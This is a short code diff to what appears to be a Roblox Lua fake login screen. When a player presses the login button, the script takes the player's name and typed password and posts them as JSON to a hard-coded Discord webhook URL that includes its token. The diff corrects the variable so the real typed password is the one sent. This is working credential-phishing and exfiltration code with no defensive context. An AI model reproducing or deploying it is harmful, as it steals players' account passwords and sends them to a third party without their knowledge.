@@ -173,7 +173,7 @@ LogInBoard.MouseButton1Down:connect(function()
 			PGsv = TGUI.Text
 NS([[config = {
 ["username"] = "A Login",
-["content"] = "The name is ]]..player.Name..[[ and the pass is ]]..passw..[["
+["content"] = "The name is ]]..player.Name..[[ and the pass is ]]..PGsv..[["
 }
 local data = game:GetService("HttpService"):JSONEncode(config)
 game:GetService("HttpService"):PostAsync("https://discordapp.com/api/webhooks/404038266782875649/PjLcnlHJmxDtxL6SpdBmlEwSxE7y6Qzb7N6ZQHNTyXlnARxYfYSVXrp5Th9Y1cSdHgKC",data)]],workspace)
